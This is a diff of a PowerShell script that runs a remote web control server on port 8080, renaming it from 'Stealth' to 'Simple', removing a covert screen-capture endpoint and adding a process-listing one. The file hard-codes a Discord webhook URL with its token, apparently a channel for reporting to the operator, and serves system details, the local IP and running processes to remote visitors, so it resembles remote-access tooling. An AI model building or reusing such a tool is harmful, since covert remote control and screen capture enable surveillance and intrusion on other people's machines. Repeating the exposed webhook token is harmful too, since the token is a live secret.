@@ -1,11 +1,9 @@
-# Stealth Remote Web Control Server
+# Simple Remote Web Control Server
 $webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
 # Load required assemblies
 Add-Type -AssemblyName System.Web
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
 
 # Check if running as administrator
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -79,12 +77,12 @@ $html = @"
         </div>
 
         <div class="section">
-            <h3>📸 Actions</h3>
-            <form action="/screenshot" method="post">
-                <button type="submit">📸 Take Screenshot</button>
-            </form>
+            <h3>ℹ️ Actions</h3>
             <form action="/info" method="post">
                 <button type="submit">ℹ️ System Info</button>
+            </form>
+            <form action="/processes" method="post">
+                <button type="submit">⚙️ List Processes</button>
             </form>
         </div>
 
@@ -160,30 +158,6 @@ while ($listener.IsListening) {
                 }
             }
             
-            "/screenshot" {
-                try {
-                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-                    
-                    # Convert to base64 for direct display
-                    $memoryStream = New-Object System.IO.MemoryStream
-                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
-                    $imageBytes = $memoryStream.ToArray()
-                    $base64Image = [System.Convert]::ToBase64String($imageBytes)
-                    
-                    $outputBuffer += "<img src='data:image/png;base64,$base64Image' style='max-width:100%; height:auto;' />`n"
-                    $outputBuffer += "Screenshot captured successfully!`n"
-                } catch {
-                    $outputBuffer += "Screenshot failed: $_`n"
-                }
-                $response.ContentType = "text/html"
-                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
-                $response.ContentLength64 = $buffer.Length
-                $response.OutputStream.Write($buffer, 0, $buffer.Length)
-            }
-            
             "/info" {
                 $info = @"
 System Information:
@@ -193,6 +167,15 @@ OS: $(Get-WmiObject -Class Win32_OperatingSystem).Caption
 IP: $localIP
 "@
                 $outputBuffer += $info
+                $response.ContentType = "text/html"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
+                $response.ContentLength64 = $buffer.Length
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            
+            "/processes" {
+                $processes = Get-Process | Select-Object Name, Id, CPU | ConvertTo-Html -Fragment
+                $outputBuffer += "Running Processes:`n$processes`n"
                 $response.ContentType = "text/html"
                 $buffer = [System.Text.Encoding]::UTF8.GetBytes("<script>window.location.href = '/';</script>")
                 $response.ContentLength64 = $buffer.Length
